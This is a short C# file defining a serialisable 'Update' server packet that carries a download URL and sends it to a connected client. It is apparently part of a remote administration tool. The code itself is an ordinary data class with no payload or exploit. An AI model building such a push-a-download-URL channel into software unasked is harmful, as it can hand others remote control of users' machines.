﻿using ProtoBuf;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Update : IPacket
    {
        [ProtoMember(1)]
        public string DownloadURL { get; set; }

        public Update()
        {
        }

        public Update(string downloadurl)
        {
            this.DownloadURL = downloadurl;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}